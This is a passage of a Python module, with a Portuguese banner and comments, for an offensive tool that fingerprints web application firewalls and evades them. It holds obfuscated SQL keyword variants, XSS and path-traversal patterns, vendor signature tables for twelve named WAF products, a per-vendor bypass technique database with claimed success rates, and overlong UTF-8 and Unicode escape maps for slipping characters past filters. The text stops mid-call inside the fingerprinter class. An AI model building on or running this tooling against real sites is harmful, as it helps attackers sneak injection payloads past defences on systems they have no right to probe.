#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  ⚔️  SIREN WAF BYPASS — Web Application Firewall Evasion Engine  ⚔️         ██
██                                                                                ██
██  Motor completo de evasao de WAFs com fingerprinting, transformacao de         ██
██  payloads, mutation genetica e bypass automatizado.                            ██
██                                                                                ██
██  Capacidades:                                                                  ██
██    • WAF fingerprinting — 12+ vendors por headers, cookies, body patterns    ██
██    • 50+ transformacoes — URL encode, Unicode, case, comments, HPP           ██
██    • Encoding chaining — pipelines multi-camada com auto-detect              ██
██    • Genetic mutation — evolucao de payloads com crossover e selecao         ██
██    • Auto-bypass — ciclo automatico de tentativas com scoring                ██
██    • Profile database — caracteristicas conhecidas de cada WAF              ██
██    • Report generation — estatisticas de bypass por tecnica e vendor         ██
██                                                                                ██
██  "SIREN nao bate na porta — ela passa pela parede."                           ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import base64
import codecs
import copy
import hashlib
import html
import json
import logging
import math
import os
import random
import re
import string
import struct
import threading
import time
import urllib.parse
import uuid
from collections import defaultdict, deque
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import (
    Any,
    Callable,
    Deque,
    Dict,
    FrozenSet,
    List,
    Optional,
    Set,
    Tuple,
    Union,
)

logger = logging.getLogger("siren.evasion.waf_bypass")


# ════════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ════════════════════════════════════════════════════════════════════════════════

MAX_PAYLOAD_SIZE = 8192
MAX_MUTATION_GENERATIONS = 100
MAX_CHAIN_DEPTH = 10
DEFAULT_CONFIDENCE_THRESHOLD = 0.5
DEFAULT_TIMEOUT = 10.0
MAX_TECHNIQUES_PER_RUN = 200
POPULATION_SIZE = 20
MUTATION_RATE = 0.3
CROSSOVER_RATE = 0.7
ELITE_COUNT = 4


# ════════════════════════════════════════════════════════════════════════════════
# ENUMS
# ════════════════════════════════════════════════════════════════════════════════

class WAFVendor(Enum):
    """Known WAF vendors."""
    UNKNOWN = auto()
    MODSECURITY = auto()
    CLOUDFLARE = auto()
    AWS_WAF = auto()
    AKAMAI = auto()
    IMPERVA = auto()
    F5_BIG_IP = auto()
    SUCURI = auto()
    BARRACUDA = auto()
    FORTINET = auto()
    DENYALL = auto()
    WALLARM = auto()
    WORDFENCE = auto()
    GENERIC = auto()


class TransformType(Enum):
    """Payload transformation categories."""
    URL_ENCODE = auto()
    DOUBLE_URL_ENCODE = auto()
    TRIPLE_URL_ENCODE = auto()
    OVERLONG_UTF8 = auto()
    UNICODE_NORMALIZE = auto()
    CASE_ALTERNATE = auto()
    CASE_UPPER = auto()
    CASE_RANDOM = auto()
    COMMENT_INLINE = auto()
    COMMENT_MYSQL = auto()
    COMMENT_NESTED = auto()
    WHITESPACE_TAB = auto()
    WHITESPACE_NEWLINE = auto()
    WHITESPACE_CR = auto()
    WHITESPACE_VTAB = auto()
    WHITESPACE_COMMENT = auto()
    CONCAT_SQL = auto()
    CONCAT_JS = auto()
    CONCAT_PHP = auto()
    NUMERIC_HEX = auto()
    NUMERIC_BINARY = auto()
    NUMERIC_SCIENTIFIC = auto()
    NUMERIC_CHAR = auto()
    HTML_DECIMAL = auto()
    HTML_HEX = auto()
    HTML_NAMED = auto()
    HTML_NULL_BYTE = auto()
    NULL_BYTE_PREFIX = auto()
    NULL_BYTE_EXTENSION = auto()
    HPP_DUPLICATE = auto()
    HPP_ARRAY = auto()
    CONTENT_TYPE_JSON = auto()
    CONTENT_TYPE_MULTIPART = auto()
    CONTENT_TYPE_XML = auto()
    BASE64_ENCODE = auto()
    ROT13 = auto()
    UNICODE_ESCAPE = auto()
    HEX_ENCODE = auto()
    OCTAL_ENCODE = auto()
    DOUBLE_SLASH = auto()
    PATH_TRAVERSAL_BYPASS = auto()
    HEADER_INJECTION = auto()
    CHUNKED_ENCODING = auto()
    WILDCARD_BYPASS = auto()
    JSON_UNICODE_ESCAPE = auto()
    CDATA_WRAP = auto()
    BACKTICK_WRAP = auto()
    PARENTHESIS_WRAP = auto()
    MULTILINE_BREAK = auto()
    CHARSET_MIX = auto()
    BOUNDARY_EMOJI = auto()
    TAB_INLINE = auto()
    SEMICOLON_TERMINATE = auto()


class ParanoiaLevel(Enum):
    """WAF paranoia / sensitivity level estimate."""
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    EXTREME = 4


class DetectionMethod(Enum):
    """How we determined a bypass worked."""
    STATUS_CODE = auto()
    BODY_CONTENT = auto()
    RESPONSE_TIME = auto()
    HEADER_ABSENCE = auto()
    REFLECTION = auto()
    ERROR_BASED = auto()
    BLIND_TIMING = auto()


# ════════════════════════════════════════════════════════════════════════════════
# SQL KEYWORDS AND PATTERNS
# ════════════════════════════════════════════════════════════════════════════════

SQL_KEYWORDS: List[str] = [
    "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "ALTER",
    "CREATE", "FROM", "WHERE", "AND", "OR", "NOT", "NULL", "TABLE",
    "INTO", "VALUES", "SET", "EXEC", "EXECUTE", "HAVING", "GROUP",
    "ORDER", "BY", "LIMIT", "OFFSET", "JOIN", "LEFT", "RIGHT",
    "INNER", "OUTER", "CROSS", "ON", "AS", "LIKE", "IN", "BETWEEN",
    "EXISTS", "CASE", "WHEN", "THEN", "ELSE", "END", "CAST",
    "CONVERT", "DECLARE", "FETCH", "OPEN", "CLOSE", "DEALLOCATE",
    "WAITFOR", "DELAY", "BENCHMARK", "SLEEP", "IF", "CHAR",
    "CONCAT", "SUBSTRING", "ASCII", "LENGTH", "REPLACE", "TRIM",
]

SQL_KEYWORD_SYNONYMS: Dict[str, List[str]] = {
    "SELECT": ["(SELECT", "/*!50000SELECT*/", "SEL/**/ECT", "sElEcT"],
    "UNION": ["UnIoN", "UN/**/ION", "/*!50000UNION*/", "uni%6fn"],
    "AND": ["&&", "aNd", "%26%26", "AN/**/D"],
    "OR": ["||", "oR", "%7c%7c", "O/**/R"],
    "FROM": ["FrOm", "FR/**/OM", "/*!50000FROM*/"],
    "WHERE": ["WhErE", "WH/**/ERE", "/*!50000WHERE*/"],
    "INSERT": ["InSeRt", "INS/**/ERT", "/*!50000INSERT*/"],
    "UPDATE": ["UpDaTe", "UPD/**/ATE", "/*!50000UPDATE*/"],
    "DELETE": ["DeLeTe", "DEL/**/ETE", "/*!50000DELETE*/"],
    "DROP": ["DrOp", "DR/**/OP", "/*!50000DROP*/"],
    "NULL": ["NuLl", "NU/**/LL", "0x00"],
    "TABLE": ["TaBlE", "TAB/**/LE", "/*!50000TABLE*/"],
    "EXEC": ["ExEc", "EX/**/EC", "/*!50000EXEC*/"],
    "SLEEP": ["SlEeP", "SLE/**/EP", "/*!50000SLEEP*/"],
    "BENCHMARK": ["BeNcHmArK", "BEN/**/CHMARK", "/*!50000BENCHMARK*/"],
    "WAITFOR": ["WaItFoR", "WAI/**/TFOR", "/*!50000WAITFOR*/"],
    "CONCAT": ["CoNcAt", "CON/**/CAT", "/*!50000CONCAT*/"],
}

XSS_PATTERNS: List[str] = [
    "<script>", "</script>", "javascript:", "onerror=", "onload=",
    "onfocus=", "onmouseover=", "alert(", "prompt(", "confirm(",
    "document.cookie", "document.domain", "eval(", "setTimeout(",
    "setInterval(", "innerHTML", "outerHTML", "fromCharCode",
]

TRAVERSAL_PATTERNS: List[str] = [
    "../", "..\\", "%2e%2e%2f", "%2e%2e/", "..%2f", "%2e%2e%5c",
    "..%5c", "%252e%252e%252f", "....//", "..;/",
]


# ════════════════════════════════════════════════════════════════════════════════
# WAF SIGNATURE DATABASE
# ════════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES: Dict[str, Dict[str, Any]] = {
    "modsecurity": {
        "vendor": WAFVendor.MODSECURITY,
        "headers": {"Server": ["mod_security", "NOYB", "ModSecurity"]},
        "cookies": [],
        "status_codes": [403, 406, 501],
        "body_patterns": [
            "mod_security", "ModSecurity", "This error was generated by Mod_Security",
            "rules of the mod_security module", "NOYB",
        ],
    },
    "cloudflare": {
        "vendor": WAFVendor.CLOUDFLARE,
        "headers": {
            "Server": ["cloudflare"],
            "cf-ray": [""],
            "CF-RAY": [""],
            "cf-cache-status": [""],
        },
        "cookies": ["__cfduid", "cf_clearance", "__cf_bm"],
        "status_codes": [403, 503, 1020],
        "body_patterns": [
            "Cloudflare", "cloudflare", "Attention Required",
            "cf-error-details", "Ray ID:", "CLOUDFLARE_ERROR_500S_BOX",
            "Please enable cookies", "cf-browser-verification",
        ],
    },
    "aws_waf": {
        "vendor": WAFVendor.AWS_WAF,
        "headers": {"x-amzn-RequestId": [""], "x-amz-cf-id": [""]},
        "cookies": ["awsalb", "awsalbcors", "AWSALB"],
        "status_codes": [403],
        "body_patterns": [
            "AWS", "Request blocked", "x-amzn-waf",
            "awswaf", "AWSWAF",
        ],
    },
    "akamai": {
        "vendor": WAFVendor.AKAMAI,
        "headers": {
            "Server": ["AkamaiGHost", "AkamaiNetStorage"],
            "X-Akamai-Transformed": [""],
        },
        "cookies": ["akamai_generated", "AkamaiEdge", "aka"],
        "status_codes": [403],
        "body_patterns": [
            "Access Denied", "AkamaiGHost", "Akamai",
            "Reference&#32;&#35;", "akamai",
        ],
    },
    "imperva": {
        "vendor": WAFVendor.IMPERVA,
        "headers": {
            "X-CDN": ["Incapsula", "Imperva"],
            "X-Iinfo": [""],
        },
        "cookies": ["visid_incap", "incap_ses", "nlbi_", "___utmvc"],
        "status_codes": [403],
        "body_patterns": [
            "Incapsula", "Imperva", "incapsula", "/_Incapsula_Resource",
            "Request unsuccessful", "incident",
        ],
    },
    "f5_big_ip": {
        "vendor": WAFVendor.F5_BIG_IP,
        "headers": {
            "Server": ["BigIP", "BIG-IP", "F5"],
            "X-WA-Info": [""],
        },
        "cookies": ["BIGipServer", "TS", "f5_cspm", "MRHSession"],
        "status_codes": [403],
        "body_patterns": [
            "BIG-IP", "F5", "The requested URL was rejected",
            "support ID", "BigIP",
        ],
    },
    "sucuri": {
        "vendor": WAFVendor.SUCURI,
        "headers": {
            "Server": ["Sucuri", "Sucuri/Cloudproxy"],
            "X-Sucuri-ID": [""],
            "x-sucuri-id": [""],
            "X-Sucuri-Cache": [""],
        },
        "cookies": ["sucuri_cloudproxy"],
        "status_codes": [403],
        "body_patterns": [
            "Sucuri", "sucuri", "Access Denied - Sucuri Website Firewall",
            "cloudproxy", "Sucuri WebSite Firewall",
        ],
    },
    "barracuda": {
        "vendor": WAFVendor.BARRACUDA,
        "headers": {"Server": ["Barracuda"]},
        "cookies": ["barra_counter_session", "BNI__BARRACUDA_LB_COOKIE"],
        "status_codes": [403],
        "body_patterns": [
            "Barracuda", "barracuda", "You have been blocked",
            "barra_counter_session",
        ],
    },
    "fortinet": {
        "vendor": WAFVendor.FORTINET,
        "headers": {"Server": ["FortiWeb", "FortiGate"]},
        "cookies": ["FORTIWAFSID", "cookiesession1"],
        "status_codes": [403],
        "body_patterns": [
            "FortiWeb", "FortiGate", "Fortinet", ".fgt_icon",
            "Server unavailable", "fortigate",
        ],
    },
    "denyall": {
        "vendor": WAFVendor.DENYALL,
        "headers": {"Server": ["DenyAll"]},
        "cookies": ["sessioncookie"],
        "status_codes": [403],
        "body_patterns": [
            "DenyAll", "Condition Intercepted", "denyall",
        ],
    },
    "wallarm": {
        "vendor": WAFVendor.WALLARM,
        "headers": {"Server": ["nginx-wallarm"]},
        "cookies": [],
        "status_codes": [403],
        "body_patterns": [
            "wallarm", "Wallarm", "nginx-wallarm",
        ],
    },
    "wordfence": {
        "vendor": WAFVendor.WORDFENCE,
        "headers": {},
        "cookies": ["wfwaf-authcookie"],
        "status_codes": [403, 503],
        "body_patterns": [
            "Wordfence", "wordfence", "This response was generated by Wordfence",
            "wfFunc", "Your access to this site has been limited",
            "Generated by Wordfence",
        ],
    },
}


# ════════════════════════════════════════════════════════════════════════════════
# WAF-SPECIFIC BYPASS TECHNIQUE DATABASE
# ════════════════════════════════════════════════════════════════════════════════

WAF_BYPASS_DB: Dict[str, List[Dict[str, Any]]] = {
    "modsecurity": [
        {"id": "modsec-001", "name": "Inline comment splitting",
         "transforms": [TransformType.COMMENT_INLINE], "success_rate": 0.65},
        {"id": "modsec-002", "name": "MySQL versioned comment",
         "transforms": [TransformType.COMMENT_MYSQL], "success_rate": 0.55},
        {"id": "modsec-003", "name": "Overlong UTF-8",
         "transforms": [TransformType.OVERLONG_UTF8], "success_rate": 0.50},
        {"id": "modsec-004", "name": "Double URL encode",
         "transforms": [TransformType.DOUBLE_URL_ENCODE], "success_rate": 0.60},
        {"id": "modsec-005", "name": "HPP duplicate param",
         "transforms": [TransformType.HPP_DUPLICATE], "success_rate": 0.45},
        {"id": "modsec-006", "name": "Alternating case + comments",
         "transforms": [TransformType.CASE_ALTERNATE, TransformType.COMMENT_INLINE],
         "success_rate": 0.70},
        {"id": "modsec-007", "name": "Whitespace alternatives",
         "transforms": [TransformType.WHITESPACE_TAB], "success_rate": 0.40},
        {"id": "modsec-008", "name": "Null byte prefix",
         "transforms": [TransformType.NULL_BYTE_PREFIX], "success_rate": 0.35},
    ],
    "cloudflare": [
        {"id": "cf-001", "name": "Unicode normalization bypass",
         "transforms": [TransformType.UNICODE_NORMALIZE], "success_rate": 0.40},
        {"id": "cf-002", "name": "JSON unicode escape",
         "transforms": [TransformType.JSON_UNICODE_ESCAPE], "success_rate": 0.50},
        {"id": "cf-003", "name": "Multiline break",
         "transforms": [TransformType.MULTILINE_BREAK], "success_rate": 0.35},
        {"id": "cf-004", "name": "Content-Type XML switch",
         "transforms": [TransformType.CONTENT_TYPE_XML], "success_rate": 0.30},
        {"id": "cf-005", "name": "Double URL + case alternation",
         "transforms": [TransformType.DOUBLE_URL_ENCODE, TransformType.CASE_ALTERNATE],
         "success_rate": 0.45},
        {"id": "cf-006", "name": "Charset mixing",
         "transforms": [TransformType.CHARSET_MIX], "success_rate": 0.30},
    ],
    "aws_waf": [
        {"id": "aws-001", "name": "Overlong UTF-8 bypass",
         "transforms": [TransformType.OVERLONG_UTF8], "success_rate": 0.45},
        {"id": "aws-002", "name": "HPP array notation",
         "transforms": [TransformType.HPP_ARRAY], "success_rate": 0.55},
        {"id": "aws-003", "name": "Content-Type multipart",
         "transforms": [TransformType.CONTENT_TYPE_MULTIPART], "success_rate": 0.40},
        {"id": "aws-004", "name": "Triple encode",
         "transforms": [TransformType.TRIPLE_URL_ENCODE], "success_rate": 0.35},
        {"id": "aws-005", "name": "Chunked transfer",
         "transforms": [TransformType.CHUNKED_ENCODING], "success_rate": 0.50},
    ],
    "akamai": [
        {"id": "akamai-001", "name": "Unicode escape sequences",
         "transforms": [TransformType.UNICODE_ESCAPE], "success_rate": 0.40},
        {"id": "akamai-002", "name": "Nested comments",
         "transforms": [TransformType.COMMENT_NESTED], "success_rate": 0.50},
        {"id": "akamai-003", "name": "Base64 payload wrap",
         "transforms": [TransformType.BASE64_ENCODE], "success_rate": 0.35},
        {"id": "akamai-004", "name": "Double encode + comments",
         "transforms": [TransformType.DOUBLE_URL_ENCODE, TransformType.COMMENT_INLINE],
         "success_rate": 0.55},
    ],
    "imperva": [
        {"id": "imp-001", "name": "MySQL versioned comments",
         "transforms": [TransformType.COMMENT_MYSQL], "success_rate": 0.50},
        {"id": "imp-002", "name": "HPP duplicate params",
         "transforms": [TransformType.HPP_DUPLICATE], "success_rate": 0.60},
        {"id": "imp-003", "name": "Overlong UTF-8 + case",
         "transforms": [TransformType.OVERLONG_UTF8, TransformType.CASE_ALTERNATE],
         "success_rate": 0.45},
        {"id": "imp-004", "name": "Numeric hex encoding",
         "transforms": [TransformType.NUMERIC_HEX], "success_rate": 0.40},
        {"id": "imp-005", "name": "Backtick wrapping",
         "transforms": [TransformType.BACKTICK_WRAP], "success_rate": 0.35},
    ],
    "f5_big_ip": [
        {"id": "f5-001", "name": "Tab whitespace replacement",
         "transforms": [TransformType.WHITESPACE_TAB], "success_rate": 0.55},
        {"id": "f5-002", "name": "Comment + case",
         "transforms": [TransformType.COMMENT_INLINE, TransformType.CASE_RANDOM],
         "success_rate": 0.60},
        {"id": "f5-003", "name": "URL encode + newline",
         "transforms": [TransformType.URL_ENCODE, TransformType.WHITESPACE_NEWLINE],
         "success_rate": 0.45},
        {"id": "f5-004", "name": "Concat SQL split",
         "transforms": [TransformType.CONCAT_SQL], "success_rate": 0.40},
    ],
    "sucuri": [
        {"id": "suc-001", "name": "Double URL encode",
         "transforms": [TransformType.DOUBLE_URL_ENCODE], "success_rate": 0.55},
        {"id": "suc-002", "name": "Content-Type switching",
         "transforms": [TransformType.CONTENT_TYPE_JSON], "success_rate": 0.45},
        {"id": "suc-003", "name": "Null byte + encode",
         "transforms": [TransformType.NULL_BYTE_PREFIX, TransformType.URL_ENCODE],
         "success_rate": 0.40},
        {"id": "suc-004", "name": "Unicode normalization",
         "transforms": [TransformType.UNICODE_NORMALIZE], "success_rate": 0.50},
    ],
    "barracuda": [
        {"id": "bar-001", "name": "Case alternation",
         "transforms": [TransformType.CASE_ALTERNATE], "success_rate": 0.60},
        {"id": "bar-002", "name": "Inline comments",
         "transforms": [TransformType.COMMENT_INLINE], "success_rate": 0.55},
        {"id": "bar-003", "name": "HPP array + encode",
         "transforms": [TransformType.HPP_ARRAY, TransformType.URL_ENCODE],
         "success_rate": 0.50},
    ],
    "fortinet": [
        {"id": "fort-001", "name": "MySQL versioned comments",
         "transforms": [TransformType.COMMENT_MYSQL], "success_rate": 0.55},
        {"id": "fort-002", "name": "Double encode",
         "transforms": [TransformType.DOUBLE_URL_ENCODE], "success_rate": 0.50},
        {"id": "fort-003", "name": "Whitespace CR/LF",
         "transforms": [TransformType.WHITESPACE_CR, TransformType.WHITESPACE_NEWLINE],
         "success_rate": 0.40},
    ],
    "denyall": [
        {"id": "deny-001", "name": "Case alternation + comments",
         "transforms": [TransformType.CASE_ALTERNATE, TransformType.COMMENT_INLINE],
         "success_rate": 0.60},
        {"id": "deny-002", "name": "URL encode + HPP",
         "transforms": [TransformType.URL_ENCODE, TransformType.HPP_DUPLICATE],
         "success_rate": 0.50},
    ],
    "wallarm": [
        {"id": "wall-001", "name": "Overlong UTF-8",
         "transforms": [TransformType.OVERLONG_UTF8], "success_rate": 0.45},
        {"id": "wall-002", "name": "JSON unicode escape",
         "transforms": [TransformType.JSON_UNICODE_ESCAPE], "success_rate": 0.50},
        {"id": "wall-003", "name": "CDATA wrap",
         "transforms": [TransformType.CDATA_WRAP], "success_rate": 0.35},
    ],
    "wordfence": [
        {"id": "wf-001", "name": "Double URL encode",
         "transforms": [TransformType.DOUBLE_URL_ENCODE], "success_rate": 0.55},
        {"id": "wf-002", "name": "Null byte prefix",
         "transforms": [TransformType.NULL_BYTE_PREFIX], "success_rate": 0.40},
        {"id": "wf-003", "name": "Case + comment + encode",
         "transforms": [TransformType.CASE_ALTERNATE, TransformType.COMMENT_INLINE,
                        TransformType.URL_ENCODE], "success_rate": 0.50},
        {"id": "wf-004", "name": "HPP array notation",
         "transforms": [TransformType.HPP_ARRAY], "success_rate": 0.45},
    ],
    "generic": [
        {"id": "gen-001", "name": "Double URL encode",
         "transforms": [TransformType.DOUBLE_URL_ENCODE], "success_rate": 0.50},
        {"id": "gen-002", "name": "Case alternation",
         "transforms": [TransformType.CASE_ALTERNATE], "success_rate": 0.45},
        {"id": "gen-003", "name": "Inline comments",
         "transforms": [TransformType.COMMENT_INLINE], "success_rate": 0.50},
        {"id": "gen-004", "name": "Overlong UTF-8",
         "transforms": [TransformType.OVERLONG_UTF8], "success_rate": 0.40},
        {"id": "gen-005", "name": "MySQL versioned comments",
         "transforms": [TransformType.COMMENT_MYSQL], "success_rate": 0.45},
        {"id": "gen-006", "name": "Null byte prefix",
         "transforms": [TransformType.NULL_BYTE_PREFIX], "success_rate": 0.35},
        {"id": "gen-007", "name": "HPP duplicate",
         "transforms": [TransformType.HPP_DUPLICATE], "success_rate": 0.40},
        {"id": "gen-008", "name": "Whitespace tab",
         "transforms": [TransformType.WHITESPACE_TAB], "success_rate": 0.35},
        {"id": "gen-009", "name": "Triple encode",
         "transforms": [TransformType.TRIPLE_URL_ENCODE], "success_rate": 0.30},
        {"id": "gen-010", "name": "Unicode normalization",
         "transforms": [TransformType.UNICODE_NORMALIZE], "success_rate": 0.35},
    ],
}


# ════════════════════════════════════════════════════════════════════════════════
# OVERLONG UTF-8 MAP
# ════════════════════════════════════════════════════════════════════════════════

OVERLONG_UTF8_MAP: Dict[str, str] = {
    "'": "%c0%a7",
    '"': "%c0%a2",
    "<": "%c0%bc",
    ">": "%c0%be",
    "/": "%c0%af",
    "\\": "%c1%9c",
    " ": "%c0%a0",
    "=": "%c0%bd",
    "(": "%c0%a8",
    ")": "%c0%a9",
    ";": "%c0%bb",
    "&": "%c0%a6",
    "|": "%c1%bc",
    "`": "%c1%a0",
}

UNICODE_ESCAPE_MAP: Dict[str, str] = {
    "'": "\\u0027",
    '"': "\\u0022",
    "<": "\\u003c",
    ">": "\\u003e",
    "/": "\\u002f",
    "\\": "\\u005c",
    " ": "\\u0020",
    "=": "\\u003d",
    "(": "\\u0028",
    ")": "\\u0029",
    ";": "\\u003b",
    "&": "\\u0026",
    "|": "\\u007c",
}

HTML_NAMED_MAP: Dict[str, str] = {
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
    "&": "&amp;",
    " ": "&nbsp;",
    "/": "&#47;",
}


# ════════════════════════════════════════════════════════════════════════════════
# DATACLASSES
# ════════════════════════════════════════════════════════════════════════════════

@dataclass
class WAFProfile:
    """Known characteristics of a detected WAF."""

    vendor: WAFVendor = WAFVendor.UNKNOWN
    vendor_name: str = "unknown"
    version: str = ""
    confidence: float = 0.0
    known_bypasses: List[str] = field(default_factory=list)
    blocked_patterns: List[str] = field(default_factory=list)
    encoding_support: List[str] = field(default_factory=list)
    paranoia_level: ParanoiaLevel = ParanoiaLevel.MEDIUM
    detected_headers: Dict[str, str] = field(default_factory=dict)
    detected_cookies: List[str] = field(default_factory=list)
    detected_body_patterns: List[str] = field(default_factory=list)
    status_code: int = 0
    fingerprint_timestamp: float = field(default_factory=time.time)
    raw_evidence: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "vendor": self.vendor.name,
            "vendor_name": self.vendor_name,
            "version": self.version,
            "confidence": self.confidence,
            "known_bypasses": self.known_bypasses,
            "blocked_patterns": self.blocked_patterns,
            "encoding_support": self.encoding_support,
            "paranoia_level": self.paranoia_level.name,
            "detected_headers": self.detected_headers,
            "detected_cookies": self.detected_cookies,
            "detected_body_patterns": self.detected_body_patterns,
            "status_code": self.status_code,
            "fingerprint_timestamp": self.fingerprint_timestamp,
            "raw_evidence": self.raw_evidence,
        }


@dataclass
class BypassTechnique:
    """A specific WAF bypass technique definition."""

    technique_id: str = ""
    name: str = ""
    description: str = ""
    target_waf: str = "generic"
    payload_template: str = ""
    encoding_chain: List[TransformType] = field(default_factory=list)
    success_rate: float = 0.0
    detection_risk: float = 0.5
    category: str = ""
    tags: List[str] = field(default_factory=list)
    created_at: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "technique_id": self.technique_id,
            "name": self.name,
            "description": self.description,
            "target_waf": self.target_waf,
            "payload_template": self.payload_template,
            "encoding_chain": [t.name for t in self.encoding_chain],
            "success_rate": self.success_rate,
            "detection_risk": self.detection_risk,
            "category": self.category,
            "tags": self.tags,
            "created_at": self.created_at,
        }


@dataclass
class BypassResult:
    """Result of a single bypass attempt."""

    result_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    original_payload: str = ""
    transformed_payload: str = ""
    technique_used: str = ""
    technique_id: str = ""
    waf_bypassed: bool = False
    response_code: int = 0
    response_body_snippet: str = ""
    detection_method: DetectionMethod = DetectionMethod.STATUS_CODE
    confidence: float = 0.0
    transform_chain: List[str] = field(default_factory=list)
    elapsed_time: float = 0.0
    timestamp: float = field(default_factory=time.time)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "result_id": self.result_id,
            "original_payload": self.original_payload,
            "transformed_payload": self.transformed_payload,
            "technique_used": self.technique_used,
            "technique_id": self.technique_id,
            "waf_bypassed": self.waf_bypassed,
            "response_code": self.response_code,
            "response_body_snippet": self.response_body_snippet,
            "detection_method": self.detection_method.name,
            "confidence": self.confidence,
            "transform_chain": self.transform_chain,
            "elapsed_time": self.elapsed_time,
            "timestamp": self.timestamp,
            "metadata": self.metadata,
        }


@dataclass
class WAFBypassReport:
    """Full report of WAF bypass operations."""

    report_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    target_url: str = ""
    waf_profile: Optional[WAFProfile] = None
    total_attempts: int = 0
    successful_bypasses: int = 0
    failed_attempts: int = 0
    bypass_rate: float = 0.0
    results: List[BypassResult] = field(default_factory=list)
    techniques_used: List[str] = field(default_factory=list)
    best_technique: str = ""
    best_payload: str = ""
    statistics: Dict[str, Any] = field(default_factory=dict)
    started_at: float = field(default_factory=time.time)
    completed_at: float = 0.0
    duration: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "report_id": self.report_id,
            "target_url": self.target_url,
            "waf_profile": self.waf_profile.to_dict() if self.waf_profile else None,
            "total_attempts": self.total_attempts,
            "successful_bypasses": self.successful_bypasses,
            "failed_attempts": self.failed_attempts,
            "bypass_rate": self.bypass_rate,
            "results": [r.to_dict() for r in self.results],
            "techniques_used": self.techniques_used,
            "best_technique": self.best_technique,
            "best_payload": self.best_payload,
            "statistics": self.statistics,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "duration": self.duration,
        }


# ════════════════════════════════════════════════════════════════════════════════
# WAF FINGERPRINTER
# ════════════════════════════════════════════════════════════════════════════════

class WAFFingerprinter:
    """
    Identifies WAF vendor by analyzing HTTP response characteristics.

    Detection methods:
      - Response headers (Server, X-CDN, cf-ray, x-sucuri-id, etc.)
      - Status codes (403 vs 406 vs 501)
      - Response body patterns (vendor-specific strings)
      - Cookie names (visid_incap, __cfduid, citrix_ns_id, etc.)

    Usage::

        fp = WAFFingerprinter()
        profile = fp.fingerprint(
            status_code=403,
            headers={"Server": "cloudflare", "cf-ray": "abc123"},
            body="Attention Required! | Cloudflare",
            cookies={"__cfduid": "xyz"}
        )
        print(profile.vendor_name)  # "cloudflare"
        print(profile.confidence)   # 0.95
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._signatures = WAF_SIGNATURES
        self._history: List[WAFProfile] = []
        logger.info("WAFFingerprinter initialized")

    def fingerprint(
        self,
        status_code: int = 0,
        headers: Optional[Dict[str, str]] = None,
        body: str = "",
        cookies: Optional[Dict[str, str]] = None,
    ) -> WAFProfile:
        """Analyze response to identify WAF vendor."""
        with self._lock:
            headers = headers or {}
            cookies = cookies or {}
            scores: Dict[str, float] = defaultdict(float)
            evidence: Dict[str, Dict[str, Any]] = defaultdict(
                lambda: {"headers": [], "cookies": [], "body": [], "status": False}
            )

            headers_lower = {k.lower(): v for k, v in headers.items()}

            for waf_name, sig in self._signatures.items():
                score = 0.0
                # --- Header matching ---
                for hdr_name, hdr_patterns in sig.get("headers", {}).items():
                    hdr_key = hdr_name.lower()
                    if hdr_key in headers_lower:
                        hdr_val = headers_lower[hdr_key].lower()
                        if not hdr_patterns or hdr_patterns == [""]:
                            # Header presence alone is a signal
                            score += 0.30
                            evidence[waf_name]["headers"].append(hdr_name)
                        else:
                            for pattern in hdr_patterns:
                                if pattern.lower() in hdr_val:
                                    score += 0.35
                                    evidence[waf_name]["headers"].append(
                                        f"{hdr_name}={pattern}"
                                    )
                                    break

                # --- Cookie matching ---
                cookie_names_lower = {k.lower() for k in cookies.keys()}
                for cookie_pattern in sig.get("cookies", []):
                    cp_lower = cookie_pattern.lower()
                    for cn in cookie_names_lower:
                        if cp_lower in cn:
                            score += 0.25
                            evidence[waf_name]["cookies"].append(cookie_pattern)
                            break

                # --- Status code matching ---
                if status_code in sig.get("status_codes", []):
                    score += 0.10
                    evidence[waf_name]["status"] = True

                # --- Body pattern matching ---
                body_lower = body.lower()
                body_match_count = 0
                for pattern in sig.get("body_patterns", []):
                    if pattern.lower() in body_lower:
                        body_match_count += 1
                        evidence[waf_name]["body"].append(pattern)
                if body_match_count > 0:
                    score += min(0.35, body_match_count * 0.12)

                scores[waf_name] = min(1.0, score)

            # Find the best match
            if not scores:
                profile = WAFProfile(
                    vendor=WAFVendor.UNKNOWN,
                    vendor_name="unknown",
                    confidence=0.0,
                    status_code=status_code,
                )
                self._history.append(profile)
                return profile

            best_waf = max(scores, key=scores.get)  # type: ignore[arg-type]
            best_score = scores[best_waf]

            if best_score < DEFAULT_CONFIDENCE_THRESHOLD:
                profile = WAFProfile(
                    vendor=WAFVendor.UNKNOWN,
                    vendor_name="unknown",
                    confidence=best_score,
                    status_code=status_code,
                    raw_evidence=dict(evidence),
                )
                self._history.append(profile)
                return profile

            sig = self._signatures[best_waf]
            vendor = sig["vendor"]
            bypass_ids = [
                b["id"] for b in WAF_BYPASS_DB.get(best_waf, [])
            ]

            paranoia = self._estimate_paranoia(status_code, body, headers)

            profile = WAFProfile(
                vendor=vendor,
                vendor_name=best_waf,
                confidence=round(best_score, 4),
                known_bypasses=bypass_ids,
                blocked_patterns=self._extract_blocked_patterns(body),
                encoding_support=self._estimate_encoding_support(best_waf),
                paranoia_level=paranoia,
                detected_headers={
                    k: v for k, v in headers.items()
                    if k.lower() in {h.lower() for h in sig.get("headers", {})}
                },
                detected_cookies=[
                    c for c in evidence[best_waf]["cookies"]
                ],
                detected_body_patterns=evidence[best_waf]["body"],
                status_code=status_code,
                raw_evidence=dict(evidence),
            )

            logger.info(
